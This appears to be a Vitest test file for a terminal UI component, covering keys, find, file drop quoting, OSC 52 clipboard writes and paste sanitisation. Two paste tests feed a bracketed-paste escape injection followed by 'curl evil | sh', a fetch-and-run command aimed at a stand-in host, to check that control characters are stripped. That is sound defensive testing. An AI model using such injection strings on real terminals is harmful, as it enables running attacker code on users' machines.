import { describe, expect, it, type MockInstance, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { fakeBridge } from '@renderer/testing/fake-bridge'
import { makeTermInfo } from '@renderer/testing/fixtures'
import App from '../App'
import Terminal from './Terminal'

// The terminal reads the platform once, as it loads; jsdom does not say Mac by itself.
vi.hoisted(() => {
  Object.defineProperty(window.navigator, 'userAgent', {
    configurable: true,
    value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
  })
})

const session = makeTermInfo({
  name: 'claude',
  cwd: '/Users/dev/.que/worktrees/que/app-1432-retry-logic'
})

/** Mounts the terminal, focused, and waits for it to attach. */
async function mount(): Promise<void> {
  fakeBridge.seedTerminal(session)
  render(<Terminal id={session.id} />)
  await waitFor(() => expect(fakeBridge.attachCalls()).toContain(session.id))
}

describe('Terminal', () => {
  describe('keys', () => {
    it('sends a line feed for Shift+Enter, so a program can tell it from Enter', async () => {
      const user = userEvent.setup()
      await mount()

      await user.keyboard('{Shift>}{Enter}{/Shift}')

      await waitFor(() => expect(fakeBridge.getTerminal(session.id)?.input).toBe('\n'))
    })

    it('sends a carriage return for Enter', async () => {
      const user = userEvent.setup()
      await mount()

      await user.keyboard('{Enter}')

      await waitFor(() => expect(fakeBridge.getTerminal(session.id)?.input).toBe('\r'))
    })
  })

  describe('find', () => {
    const FIND = '{Meta>}f{/Meta}'
    const field = () => screen.getByRole('textbox', { name: 'Find' })
    const count = () => screen.getByTestId(`terminal-${session.id}-find-count`)

    it('opens on Cmd+F with the keyboard in its field; Escape closes it and returns to the terminal', async () => {
      const user = userEvent.setup()
      await mount()

      await user.keyboard(FIND)
      expect(field()).toHaveFocus()

      await user.keyboard('{Escape}')
      expect(screen.queryByRole('textbox', { name: 'Find' })).not.toBeInTheDocument()
      expect(document.activeElement).toHaveClass('xterm-helper-textarea')
    })

    it('keeps what is typed in the field away from the program', async () => {
      const user = userEvent.setup()
      await mount()

      await user.keyboard(FIND)
      await user.keyboard('retry{Enter}')

      expect(field()).toHaveValue('retry')
      expect(fakeBridge.getTerminal(session.id)?.input).toBe('')
    })

    it('reads 0/0 with no match, and nothing once the field is empty', async () => {
      const user = userEvent.setup()
      await mount()

      await user.keyboard(FIND)
      await user.keyboard('nowhere')
      await waitFor(() => expect(count()).toHaveTextContent('0/0'))

      await user.clear(field())
      await waitFor(() => expect(count()).toBeEmptyDOMElement())
    })

    it("selects the field's text again on another Cmd+F", async () => {
      const user = userEvent.setup()
      await mount()

      await user.keyboard(FIND)
      await user.keyboard('retry')
      await user.keyboard(FIND)

      expect(field()).toHaveFocus()
      expect(field()).toHaveProperty('selectionStart', 0)
      expect(field()).toHaveProperty('selectionEnd', 'retry'.length)
    })
  })

  describe('drop', () => {
    /** A drag event as the browser fires it. userEvent has no drag and drop, so it is dispatched. */
    function drag(type: 'dragover' | 'drop', files: File[], types = ['Files']): Event {
      const event = Object.assign(new Event(type, { bubbles: true, cancelable: true }), {
        dataTransfer: { files, types, dropEffect: 'none' }
      })

      screen.getByTestId('terminal-viewport').dispatchEvent(event)

      return event
    }

    const shot = new File(['png'], 'my shot.png')
    const quote = new File(['text'], "it's here.txt")

    it('pastes the quoted paths, separated by a space, with no Enter', async () => {
      await mount()
      fakeBridge.seedFilePath(shot, '/Users/dev/Desktop/my shot.png')
      fakeBridge.seedFilePath(quote, "/Users/dev/Desktop/it's here.txt")

      const event = drag('drop', [shot, quote])

      await waitFor(() => {
        expect(fakeBridge.getTerminal(session.id)?.input).toBe(
          `'/Users/dev/Desktop/my shot.png' '/Users/dev/Desktop/it'\\''s here.txt'`
        )
      })
      expect(event.defaultPrevented).toBe(true)
    })

    it('does nothing with a drop that holds no file on disk, and still keeps the default away', async () => {
      await mount()

      const text = drag('drop', [], ['text/plain'])
      const memory = drag('drop', [new File(['made in memory'], 'memory.txt')])
      // A file on disk after them shows anything those two sent would be there too.
      fakeBridge.seedFilePath(shot, '/Users/dev/shot.png')
      drag('drop', [shot])

      await waitFor(() => {
        expect(fakeBridge.getTerminal(session.id)?.input).toBe(`'/Users/dev/shot.png'`)
      })
      expect(text.defaultPrevented).toBe(true)
      expect(memory.defaultPrevented).toBe(true)
    })

    it('offers to take a dragged file, and leaves any other drag to refuse itself', async () => {
      await mount()

      expect(drag('dragover', []).defaultPrevented).toBe(true)
      expect(drag('dragover', [], ['text/plain']).defaultPrevented).toBe(false)
    })
  })

  describe('OSC 52', () => {
    const osc52 = (payload: string): string => `\x1b]52;${payload}\x07`
    const SENTINEL = 'sentinel text'
    const sentinel = osc52(`c;${btoa(SENTINEL)}`)

    type Writes = MockInstance<Clipboard['writeText']>

    /** The clipboard a test reads: what userEvent installs, with its writes recorded. */
    function clipboardWrites(): Writes {
      userEvent.setup()

      return vi.spyOn(navigator.clipboard, 'writeText')
    }

    /**
     * Prints a valid write until one lands, which also waits out the attach: everything printed
     * before it has been handled by then. Returns every other write the clipboard saw.
     */
    async function otherWrites(writes: Writes): Promise<string[]> {
      await waitFor(() => {
        fakeBridge.printToTerminal(session.id, sentinel)
        expect(writes).toHaveBeenCalledWith(SENTINEL)
      })

      return writes.mock.calls.map(([text]) => text).filter((text) => text !== SENTINEL)
    }

    it('sets the clipboard from a live write', async () => {
      const writes = clipboardWrites()
      await mount()

      fakeBridge.printToTerminal(session.id, osc52(`c;${btoa('retry logic')}`))

      await waitFor(() => expect(writes).toHaveBeenCalledWith('retry logic'))
    })

    it('never answers a query: the program reads nothing, and the clipboard is untouched', async () => {
      const writes = clipboardWrites()
      await mount()

      fakeBridge.printToTerminal(session.id, osc52('c;?') + osc52(';?'))

      expect(await otherWrites(writes)).toEqual([])
      expect(fakeBridge.getTerminal(session.id)?.input).toBe('')
    })

    it('ignores another selection, malformed base64 and an oversized payload', async () => {
      const writes = clipboardWrites()
      await mount()

      fakeBridge.printToTerminal(
        session.id,
        osc52(`p;${btoa('primary')}`) +
          osc52('c;not base64!') +
          osc52(`c;${btoa('a'.repeat(1024 * 1024 + 1))}`)
      )

      expect(await otherWrites(writes)).toEqual([])
    })

    it('does not act on a snapshot replayed on attach', async () => {
      const writes = clipboardWrites()
      fakeBridge.seedTerminal(session, `old output${osc52(`c;${btoa('old write')}`)}`)
      render(<Terminal id={session.id} />)
      await waitFor(() => expect(fakeBridge.attachCalls()).toContain(session.id))

      expect(await otherWrites(writes)).toEqual([])
    })

    it('does not act on output queued while the attach is in flight', async () => {
      const writes = clipboardWrites()
      fakeBridge.seedTerminal(session)
      fakeBridge.holdAttach()
      render(<Terminal id={session.id} />)
      await waitFor(() => expect(fakeBridge.attachCalls()).toContain(session.id))

      fakeBridge.printToTerminal(session.id, osc52(`c;${btoa('queued write')}`))
      fakeBridge.releaseAttach()

      expect(await otherWrites(writes)).toEqual([])
    })
  })

  describe('paste', () => {
    it('takes the control characters out of text pasted with Cmd+V', async () => {
      const user = userEvent.setup()
      await mount()

      await user.paste('safe\x1b[201~; curl evil | sh\x07\x9b tab\there\nnext')

      await waitFor(() => {
        expect(fakeBridge.getTerminal(session.id)?.input).toBe(
          'safe[201~; curl evil | sh tab\there\rnext'
        )
      })
    })

    it('leaves a paste with no text to xterm, which sends the program an empty paste', async () => {
      const user = userEvent.setup()
      fakeBridge.seedTerminal(session, '\x1b[?2004h')
      render(<Terminal id={session.id} />)
      await waitFor(() => expect(fakeBridge.attachCalls()).toContain(session.id))

      // Pastes until the snapshot's bracketed paste mode has been parsed.
      await waitFor(async () => {
        await user.paste('')
        expect(fakeBridge.getTerminal(session.id)?.input).toContain('\x1b[200~\x1b[201~')
      })
    })
  })

  describe('right-click menu', () => {
    /** Mounts the terminal in the app, whose store the menu reads, and right-clicks it. */
    async function rightClick(user: ReturnType<typeof userEvent.setup>): Promise<void> {
      fakeBridge.seedTerminal(session)
      render(<App />)
      const viewport = await screen.findByTestId('terminal-viewport')
      await waitFor(() => expect(fakeBridge.attachCalls()).toContain(session.id))
      await user.pointer({ keys: '[MouseRight]', target: viewport })
      await screen.findByRole('menu', { name: 'Terminal' })
    }

    it('holds Paste alone when nothing is selected', async () => {
      const user = userEvent.setup()
      await rightClick(user)

      expect(screen.getByRole('menuitem', { name: 'Paste' })).toBeInTheDocument()
      expect(screen.queryByRole('menuitem', { name: 'Copy' })).not.toBeInTheDocument()
    })

    it('pastes through the terminal, which writes line ends as Enter', async () => {
      const user = userEvent.setup()
      await navigator.clipboard.writeText('first\nsecond')
      await rightClick(user)

      await user.click(screen.getByRole('menuitem', { name: 'Paste' }))

      await waitFor(() => {
        expect(fakeBridge.getTerminal(session.id)?.input).toBe('first\rsecond')
      })
      expect(screen.queryByRole('menu', { name: 'Terminal' })).not.toBeInTheDocument()
    })

    it('takes the control characters out of what it pastes', async () => {
      const user = userEvent.setup()
      await navigator.clipboard.writeText('safe\x1b[201~; curl evil | sh')
      await rightClick(user)

      await user.click(screen.getByRole('menuitem', { name: 'Paste' }))

      await waitFor(() => {
        expect(fakeBridge.getTerminal(session.id)?.input).toBe('safe[201~; curl evil | sh')
      })
    })

    it('closes on Escape and returns the keyboard to the terminal', async () => {
      const user = userEvent.setup()
      await rightClick(user)

      await user.keyboard('{Escape}')

      expect(screen.queryByRole('menu', { name: 'Terminal' })).not.toBeInTheDocument()
      expect(document.activeElement).toHaveClass('xterm-helper-textarea')
    })
  })
})
